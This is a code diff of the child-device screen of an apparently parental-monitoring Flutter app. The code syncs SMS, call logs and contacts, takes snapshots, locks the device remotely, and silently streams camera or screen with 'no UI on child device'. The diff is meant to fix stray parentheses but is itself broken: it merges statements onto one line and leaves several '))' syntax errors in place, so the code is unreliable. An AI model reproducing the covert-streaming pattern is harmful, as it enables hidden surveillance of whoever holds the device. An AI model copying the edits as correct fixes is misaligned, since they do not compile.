@@ -32,16 +32,16 @@ class ChildHomeScreen extends StatefulWidget {
 
 class _ChildHomeScreenState extends State<ChildHomeScreen>
     with WidgetsBindingObserver {
-  final _auth = AuthService());
-  final _foreground = MonitoringForegroundService());
-  final _locationSvc = LocationService());
-  final _lockSvc = RemoteLockService());
-  final _callLogSvc = CallLogService());
-  final _contactsSvc = ContactsService());
-  final _snapshotSvc = SnapshotService());
-  final _screenTimeSvc = ScreenTimeService());
-  final _batterySvc = BatteryService());
-  final _smsSvc = SmsService());
+  final _auth = AuthService();
+  final _foreground = MonitoringForegroundService();
+  final _locationSvc = LocationService();
+  final _lockSvc = RemoteLockService();
+  final _callLogSvc = CallLogService();
+  final _contactsSvc = ContactsService();
+  final _snapshotSvc = SnapshotService();
+  final _screenTimeSvc = ScreenTimeService();
+  final _batterySvc = BatteryService();
+  final _smsSvc = SmsService();
   StreamSubscription? _smsSub;
   StreamSubscription? _callSub;
 
@@ -133,7 +133,7 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
           try { _smsSvc.syncSms(uid); } catch (_) {}
           try { FirebaseDatabase.instance.ref('commands/$uid/syncSms/requested').set(false); } catch (_) {}
         }
-      }))
+      });
     } catch (_) {}
     try { _screenTimeSvc.uploadUsage(); } catch (_) {}
   }
@@ -159,9 +159,8 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
       final raw = event.snapshot.value;
       if (raw is Map) {
         setState(() =>
-            _pendingRequests = Map<String, dynamic>.from(raw)));
-      } else {
-        setState(() => _pendingRequests = {}))
+            _pendingRequests = Map<String, dynamic>.from(raw));      } else {
+        setState(() => _pendingRequests = {});
       }
     });
 
@@ -173,9 +172,8 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
       final raw = event.snapshot.value;
       if (raw is Map) {
         setState(() =>
-            _approvedParents = Map<String, dynamic>.from(raw)));
-      } else {
-        setState(() => _approvedParents = {}))
+            _approvedParents = Map<String, dynamic>.from(raw));      } else {
+        setState(() => _approvedParents = {});
       }
     });
   }
@@ -188,8 +186,7 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
       if (!mounted) return;
       final shouldLock = state.locked ||
           (state.schedule != null &&
-              RemoteLockService.shouldBeLocked(state.schedule!)));
-      setState(() => _locked = shouldLock))
+              RemoteLockService.shouldBeLocked(state.schedule!));      setState(() => _locked = shouldLock))
     });
 
     // Snapshot request
@@ -226,8 +223,7 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
         if (!mounted) return;
         final data = event.snapshot.value;
         if (data == null || data is! Map) return;
-        final map = Map<String, dynamic>.from(data));
-        final status = map['status'] as String?;
+        final map = Map<String, dynamic>.from(data);        final status = map['status'] as String?;
         if (status == 'calling') {
           final modeStr = map['mode'] as String? ?? 'camera';
           final mode = modeStr == 'screen' ? StreamMode.screen : StreamMode.camera;
@@ -240,9 +236,9 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
   void _autoStartStreaming(String uid, StreamMode mode) {
     // Silent — no UI on child device, streams directly to parent
     if (mode == StreamMode.screen) {
-      SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {}))
+      SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {});
     } else {
-      SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {}))
+      SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {});
     }
   }
 
@@ -258,7 +254,7 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
         .set(true))
     await FirebaseDatabase.instance
         .ref('users/$parentUid/children/$uid')
-        .update({'childName': childName, 'uid': uid}))
+        .update({'childName': childName, 'uid': uid});
   }
 
   Future<void> _declineParent(String parentUid) async {
@@ -360,8 +356,7 @@ class _ChildHomeScreenState extends State<ChildHomeScreen>
                       return;
                     }
                     await _locationSvc.startTracking();
-                    if (mounted) setState(() => _locationSharing = true));
-                  } else {
+                    if (mounted) setState(() => _locationSharing = true);                  } else {
                     await _locationSvc.stopTracking())
                     if (mounted) setState(() => _locationSharing = false))
                   }
@@ -526,8 +521,7 @@ class _DeviceIdCard extends StatelessWidget {
               Expanded(
                 child: GestureDetector(
                   onTap: () {
-                    Clipboard.setData(ClipboardData(text: uid)));
-                    ScaffoldMessenger.of(context).showSnackBar(
+                    Clipboard.setData(ClipboardData(text: uid));                    ScaffoldMessenger.of(context).showSnackBar(
                       const SnackBar(
                           content: Text('Device ID copied!'),
                           duration: Duration(seconds: 2)),
